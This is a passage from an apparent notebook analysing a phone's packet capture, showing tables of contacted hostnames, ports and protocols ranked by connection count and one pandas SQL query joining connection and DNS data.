      <th>8 </th>
      <td> 2016</td>
      <td>               polpix.sueddeutsche.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>9 </th>
      <td> 1722</td>
      <td> r6---sn-i5onxoxu-q0nl.googlevideo.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>10</th>
      <td> 1277</td>
      <td>            android.clients.google.com</td>
      <td>  443</td>
      <td>         sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>11</th>
      <td> 1264</td>
      <td>                      ad.flipboard.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>12</th>
      <td> 1191</td>
      <td>                  platform.twitter.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>13</th>
      <td>  989</td>
      <td>              www.google-analytics.com</td>
      <td>  443</td>
      <td>         sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>14</th>
      <td>  986</td>
      <td>                www.thisiscolossal.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>15</th>
      <td>  902</td>
      <td>                     feeds.reuters.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>16</th>
      <td>  856</td>
      <td>                     www.tagesschau.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>17</th>
      <td>  762</td>
      <td>                          i1.ytimg.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>18</th>
      <td>  727</td>
      <td>                images03.futurezone.at</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>19</th>
      <td>  725</td>
      <td>                       cdn2.spiegel.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>20</th>
      <td>  701</td>
      <td>             cdn.blog.malwarebytes.org</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>21</th>
      <td>  676</td>
      <td>                   ticks2.bugsense.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>22</th>
      <td>  557</td>
      <td>                            www.taz.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>23</th>
      <td>  513</td>
      <td>                       cdn4.spiegel.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>24</th>
      <td>  481</td>
      <td>                      mtalk.google.com</td>
      <td> 5228</td>
      <td>        sll:ip:tcp:data</td>
    </tr>
    <tr>
      <th>25</th>
      <td>  478</td>
      <td>                      www.theverge.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>26</th>
      <td>  461</td>
      <td>                           i.imgur.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>27</th>
      <td>  443</td>
      <td>                www.fahrinfo-berlin.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>28</th>
      <td>  439</td>
      <td>                    b-api.facebook.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>29</th>
      <td>  438</td>
      <td>                      intelcrawler.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>30</th>
      <td>  438</td>
      <td>                         lh3.ggpht.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>31</th>
      <td>  410</td>
      <td>                       api.twitter.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>32</th>
      <td>  398</td>
      <td>                        imap.gmail.com</td>
      <td>  993</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>33</th>
      <td>  378</td>
      <td>                         www.google.de</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>34</th>
      <td>  346</td>
      <td>                  google-analytics.com</td>
      <td>  443</td>
      <td>         sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>35</th>
      <td>  303</td>
      <td>                       bilder2.n-tv.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>36</th>
      <td>  264</td>
      <td>                           p5.focus.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>37</th>
      <td>  261</td>
      <td>                         e.apsalar.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>38</th>
      <td>  255</td>
      <td>                       bilder4.n-tv.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>39</th>
      <td>  248</td>
      <td>                         pbs.twimg.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>40</th>
      <td>  246</td>
      <td>                     gdata.youtube.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>41</th>
      <td>  244</td>
      <td>               scontent-b.xx.fbcdn.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>42</th>
      <td>  242</td>
      <td>                        www.amazon.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>43</th>
      <td>  231</td>
      <td>                            m.heute.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>44</th>
      <td>  230</td>
      <td>                       cdn3.spiegel.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>45</th>
      <td>  221</td>
      <td>                        push.parse.com</td>
      <td> 8253</td>
      <td>        sll:ip:tcp:data</td>
    </tr>
    <tr>
      <th>46</th>
      <td>  211</td>
      <td>                      e12.whatsapp.net</td>
      <td> 5222</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>47</th>
      <td>  206</td>
      <td>                    mobile.twitter.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>48</th>
      <td>  203</td>
      <td>               stats.g.doubleclick.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>49</th>
      <td>  194</td>
      <td>                  cm.g.doubleclick.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>50</th>
      <td>  186</td>
      <td>                         abs.twimg.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>51</th>
      <td>  185</td>
      <td>                           twitter.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>52</th>
      <td>  163</td>
      <td>                  st02.androidpit.info</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>53</th>
      <td>  158</td>
      <td>                        images.zeit.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>54</th>
      <td>  154</td>
      <td>                       e2.whatsapp.net</td>
      <td> 5222</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>55</th>
      <td>  153</td>
      <td>                 ecx.images-amazon.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>56</th>
      <td>  149</td>
      <td>              settings.crashlytics.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>57</th>
      <td>  145</td>
      <td>                           img.welt.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>58</th>
      <td>  143</td>
      <td>                 photos-d.ak.fbcdn.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>59</th>
      <td>  139</td>
      <td>                        gwp.nuggad.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>60</th>
      <td>  135</td>
      <td>                          ma.twimg.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>61</th>
      <td>  132</td>
      <td>                       apis.google.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>62</th>
      <td>  129</td>
      <td>                             m.faz.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>63</th>
      <td>  128</td>
      <td>                   clients3.google.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>64</th>
      <td>  126</td>
      <td>                         www.fubiz.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>65</th>
      <td>  125</td>
      <td>                 apresolve.spotify.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>66</th>
      <td>  124</td>
      <td>              mobile.smartadserver.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>67</th>
      <td>  124</td>
      <td>                 photos-b.ak.fbcdn.net</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>68</th>
      <td>  123</td>
      <td>                          www.golem.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>69</th>
      <td>  121</td>
      <td>                       ssl.gstatic.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>70</th>
      <td>  110</td>
      <td>           oauth.googleusercontent.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>71</th>
      <td>  108</td>
      <td>        fbcdn-sphotos-e-a.akamaihd.net</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>72</th>
      <td>   96</td>
      <td>               z-ecx.images-amazon.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>73</th>
      <td>   92</td>
      <td>                     fls-na.amazon.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>74</th>
      <td>   88</td>
      <td>                      e13.whatsapp.net</td>
      <td> 5222</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>75</th>
      <td>   88</td>
      <td>                         p.twitter.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>76</th>
      <td>   85</td>
      <td>                          www.heute.de</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>77</th>
      <td>   83</td>
      <td>                static.ak.facebook.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>78</th>
      <td>   81</td>
      <td>                     e.crashlytics.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>79</th>
      <td>   80</td>
      <td>          fbcdn-profile-a.akamaihd.net</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>80</th>
      <td>   76</td>
      <td>                  connect.facebook.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>81</th>
      <td>   74</td>
      <td>                    pop3.variomedia.de</td>
      <td>  995</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>82</th>
      <td>   73</td>
      <td>                        script.ioam.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>83</th>
      <td>   71</td>
      <td>                        api.tunigo.com</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>84</th>
      <td>   71</td>
      <td>          dsms0mj1bbhn4.cloudfront.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>85</th>
      <td>   70</td>
      <td>                     static.plista.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>86</th>
      <td>   69</td>
      <td>                     www.androidpit.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>87</th>
      <td>   64</td>
      <td>                         tags.w55c.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>88</th>
      <td>   63</td>
      <td>                          a0.twimg.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>89</th>
      <td>   63</td>
      <td>                   mms882.whatsapp.net</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>90</th>
      <td>   59</td>
      <td>                       e9.whatsapp.net</td>
      <td>  443</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>91</th>
      <td>   58</td>
      <td>                       e3.whatsapp.net</td>
      <td> 5222</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>92</th>
      <td>   57</td>
      <td>                   s95.research.de.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>93</th>
      <td>   57</td>
      <td>                sphotos-c.ak.fbcdn.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>94</th>
      <td>   57</td>
      <td>                   www.sueddeutsche.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>95</th>
      <td>   53</td>
      <td>               g-ecx.images-amazon.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>96</th>
      <td>   53</td>
      <td>                           www.byte.fm</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>97</th>
      <td>   52</td>
      <td>                            de.ioam.de</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>98</th>
      <td>   52</td>
      <td>                 s.amazon-adsystem.com</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
    <tr>
      <th>99</th>
      <td>   51</td>
      <td>                         blogs.faz.net</td>
      <td>   80</td>
      <td>             sll:ip:tcp</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h1 id="top-connections">Top connections</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p2 = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT COUNT(c.dst), d.dns_query, c.dstport, c.frame_protocols FROM connection AS c 
    JOIN dns AS d ON c.dst=d.dns_response
    WHERE c.frame_protocols LIKE &#34;sll:ip:tcp:%&#34;
    GROUP by c.dst
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
p2.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>COUNT(c.dst)</th>
      <th>dns_query</th>
      <th>dstport</th>
      <th>frame_protocols</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 5064575</td>
      <td>           www.googleapis.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>1 </th>
      <td>  652600</td>
      <td>             www.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>2 </th>
      <td>  504000</td>
      <td>             www.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>3 </th>
      <td>  492200</td>
      <td>             www.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>4 </th>
      <td>  254625</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>5 </th>
      <td>  146300</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>6 </th>
      <td>  137475</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>7 </th>
      <td>   96375</td>
      <td>          ticks2.bugsense.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>8 </th>
      <td>   89600</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>9 </th>
      <td>   73200</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>10</th>
      <td>   73100</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>11</th>
      <td>   62200</td>
      <td>             mtalk.google.com</td>
      <td> 5228</td>
      <td> sll:ip:tcp:data</td>
    </tr>
    <tr>
      <th>12</th>
      <td>   51425</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>13</th>
      <td>   44100</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>14</th>
      <td>   42975</td>
      <td>          clients4.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>15</th>
      <td>   42975</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>16</th>
      <td>   41125</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>17</th>
      <td>   36575</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>18</th>
      <td>   36000</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>19</th>
      <td>   34875</td>
      <td>         platform.twitter.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>20</th>
      <td>   30750</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>21</th>
      <td>   30600</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>22</th>
      <td>   29100</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>23</th>
      <td>   27900</td>
      <td>                 i1.ytimg.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>24</th>
      <td>   25000</td>
      <td>                  www.faz.net</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>25</th>
      <td>   22350</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>26</th>
      <td>   20500</td>
      <td>     www.google-analytics.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>27</th>
      <td>   19800</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>28</th>
      <td>   19600</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>29</th>
      <td>   19250</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>30</th>
      <td>   18450</td>
      <td>     www.google-analytics.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>31</th>
      <td>   16400</td>
      <td>     www.google-analytics.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>32</th>
      <td>   16050</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>33</th>
      <td>   15000</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>34</th>
      <td>   14550</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>35</th>
      <td>   14375</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>36</th>
      <td>   13750</td>
      <td>                www.google.de</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>37</th>
      <td>   13600</td>
      <td> themes.googleusercontent.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>38</th>
      <td>   13300</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>39</th>
      <td>   11000</td>
      <td>            www.tagesschau.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>40</th>
      <td>   10850</td>
      <td>           b-api.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>41</th>
      <td>   10800</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>42</th>
      <td>   10600</td>
      <td>           b-api.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>43</th>
      <td>   10325</td>
      <td>          orcart.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>44</th>
      <td>   10150</td>
      <td>                 i1.ytimg.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>45</th>
      <td>    9900</td>
      <td>            feeds.reuters.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>46</th>
      <td>    8900</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>47</th>
      <td>    8700</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>48</th>
      <td>    8625</td>
      <td>              bilder4.n-tv.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>49</th>
      <td>    8625</td>
      <td>              bilder4.n-tv.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>50</th>
      <td>    7700</td>
      <td>           b-api.facebook.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>51</th>
      <td>    7350</td>
      <td>           mobile.twitter.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>52</th>
      <td>    7300</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>53</th>
      <td>    6625</td>
      <td>       www.fahrinfo-berlin.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>54</th>
      <td>    6050</td>
      <td>              api.twitter.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>55</th>
      <td>    5550</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>56</th>
      <td>    4000</td>
      <td>               imap.gmail.com</td>
      <td>  993</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>57</th>
      <td>    4000</td>
      <td>     www.googleadservices.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>58</th>
      <td>    3750</td>
      <td>                www.google.de</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>59</th>
      <td>    3375</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>60</th>
      <td>    3300</td>
      <td>               www.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>61</th>
      <td>    3300</td>
      <td>     www.google-analytics.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>62</th>
      <td>    3300</td>
      <td>             www.theverge.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>63</th>
      <td>    3150</td>
      <td>          image5.pubmatic.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>64</th>
      <td>    2750</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>65</th>
      <td>    2550</td>
      <td>            gdata.youtube.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>66</th>
      <td>    2500</td>
      <td>         fbprod.flipboard.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>67</th>
      <td>    2500</td>
      <td>                 i1.ytimg.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>68</th>
      <td>    2250</td>
      <td>     www.googleadservices.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>69</th>
      <td>    2200</td>
      <td>                   www.taz.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>70</th>
      <td>    2025</td>
      <td>              www.youtube.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>71</th>
      <td>    1950</td>
      <td>              cdn4.spiegel.de</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>72</th>
      <td>    1950</td>
      <td>        apresolve.spotify.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>73</th>
      <td>    1900</td>
      <td>                  twitter.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>74</th>
      <td>    1750</td>
      <td>             e12.whatsapp.net</td>
      <td> 5222</td>
      <td> sll:ip:tcp:xmpp</td>
    </tr>
    <tr>
      <th>75</th>
      <td>    1550</td>
      <td>           pop3.variomedia.de</td>
      <td>  995</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>76</th>
      <td>    1500</td>
      <td>   android.clients.google.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>77</th>
      <td>    1425</td>
      <td>             e12.whatsapp.net</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>78</th>
      <td>    1400</td>
      <td>                p.twitter.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>79</th>
      <td>    1350</td>
      <td>                www.google.de</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>80</th>
      <td>    1350</td>
      <td>                yt4.ggpht.com</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>81</th>
      <td>    1300</td>
      <td>      polpix.sueddeutsche.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>82</th>
      <td>    1275</td>
      <td>               imap.gmail.com</td>
      <td>  993</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>83</th>
      <td>    1200</td>
      <td>                www.google.de</td>
      <td>  443</td>
      <td>  sll:ip:tcp:ssl</td>
    </tr>
    <tr>
      <th>84</th>
      <td>    1200</td>
      <td>      polpix.sueddeutsche.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>85</th>
      <td>    1200</td>
      <td>        weather.yahooapis.com</td>
      <td>   80</td>
      <td> sll:ip:tcp:http</td>
    </tr>
    <tr>
      <th>86</th>
      <td>    1100</td>
      <td>               push.parse.com</td>
      <td> 8253</td>
      <td> sll:ip:tcp:data</td>
    </tr>
    <tr>
      <th>87</th>
      <td>    1075</td>
      <td>              e2.whatsapp.net</td>
      <td> 5222</td>
      <td> sll:ip:tcp:xmpp</td>
    </tr>
    <tr>
      <th>88</th>
      <td>    1000</td>
      <td>        apresolve.spotify.com</td>
      <td>   80</td>
